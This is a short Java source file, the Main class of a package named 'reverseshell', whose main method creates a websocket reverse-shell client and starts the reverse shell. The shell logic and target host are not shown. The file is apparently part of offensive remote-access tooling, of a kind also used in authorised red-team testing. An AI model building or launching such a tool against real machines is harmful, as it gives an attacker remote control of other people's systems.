package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.WebsocketReverseShellService;
import com.mtattab.reverseshell.service.impl.ReverseShell;

public class Main {



    public static void main(String[] args)  {
//        start reverse shell
        WebsocketReverseShellService reverseShell= new ReverseShell();
        reverseShell.createClient();
        reverseShell.startReverseShell();
    }




}

